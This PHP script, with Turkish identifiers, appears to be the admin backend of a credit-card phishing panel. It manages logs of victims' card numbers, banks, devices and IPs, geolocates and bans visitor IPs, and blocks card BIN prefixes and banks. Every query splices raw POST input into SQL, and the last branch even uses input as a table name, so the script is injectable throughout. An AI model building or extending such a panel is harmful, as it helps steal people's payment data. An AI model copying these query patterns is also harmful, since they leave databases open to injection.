<?php
include_once(__DIR__ . '/../../config.php');
include __DIR__ . '/../Data/Server/GrabIP.php';

function tum_bosluklari_temizle($metin) {
    $metin = str_replace("/s+/", "", $metin);
    $metin = str_replace(" ", "", $metin);
    $metin = str_replace(" ", "", $metin);
    $metin = str_replace(" ", "", $metin);
    $metin = str_replace("/s/g", "", $metin);
    $metin = str_replace("/s+/g", "", $metin);
    $metin = trim($metin);
    return $metin;
  }

$islem = $_POST['islem'];
$ip = $_POST['ip'];

if ($islem and $ip) {
    if($islem == "sil") {
        $pdo->query("DELETE FROM logs WHERE ip='$ip'");
        $pdo->query("DELETE FROM logs_visitor WHERE ip='$ip'");
        exit;
    } else if($islem == "yasakla") {
        $curl = curl_init();
        curl_setopt_array($curl, [
            CURLOPT_URL => "http://ip-api.com/json/$ip",
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_ENCODING => "",
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        ]);
        $response = curl_exec($curl);
        $err = curl_error($curl);
    
        curl_close($curl);
    
        if ($err) {
            echo "cURL Error #:" . $err;
        } else {
            $json = json_decode($response);
            $il = $json->regionName;
            $ilce = $json->city;
        
            if($il == null) {
            $il = "Bulunamadı";
            }
            if($ilce == null) {
            $ilce = "Bulunamadı";
            }
        }
    
        $tarih = date('d.m.Y H:i');
        
        $logsorgu = $pdo->query("SELECT * FROM logs WHERE ip = '{$ip}'")->fetch(PDO::FETCH_ASSOC);
    
        $cihaz = $logsorgu['device'];
        $tarayici = $logsorgu['browser'];
        
        $pdo->query("INSERT INTO bans SET ip=('$ip'),konum=('$il' ', $ilce'),cihaz=('$cihaz'),tarayici=('$tarayici'),tarih=('$tarih')");
    
        $pdo->query("DELETE FROM logs WHERE ip='$ip'");
        $pdo->query("DELETE FROM logs_visitor WHERE ip='$ip'");
        exit;
    } else if($islem == "bin_banla") {
        $logsorgu = $pdo->query("SELECT * FROM logs WHERE ip = '{$ip}'")->fetch(PDO::FETCH_ASSOC);
        $kart_bin = substr(tum_bosluklari_temizle(htmlspecialchars($logsorgu['kredi_karti'])), 0, 6);
        $ifbinexists = $pdo->query("SELECT * FROM yasakli_binler WHERE banka = '{$kart_bin}'")->fetch(PDO::FETCH_ASSOC);
        if($ifbinexists) {
            echo "bin_zaten_yasakli";
            exit;
        } else {
            $stmt1 = $pdo->prepare('INSERT INTO yasakli_binler SET banka = ?');
            $stmt1->execute([ $kart_bin ]);
            exit;
        }
    } else if($islem == "banka_banla") {
        $logsorgu = $pdo->query("SELECT * FROM logs WHERE ip = '{$ip}'")->fetch(PDO::FETCH_ASSOC);
        $kart_banka = $logsorgu['banka'];
        $ifbankexists = $pdo->query("SELECT * FROM yasakli_binler WHERE banka = '{$kart_banka}'")->fetch(PDO::FETCH_ASSOC);
        if($ifbankexists) {
            echo "banka_zaten_yasakli";
            exit;
        } else {
            $stmt1 = $pdo->prepare('INSERT INTO yasakli_binler SET banka = ?');
            $stmt1->execute([ $kart_banka ]);
            exit;
        }
    } else {
        $pdo->query("INSERT INTO $islem ($islem) VALUES ('$ip')");
        exit;
    }
}
?>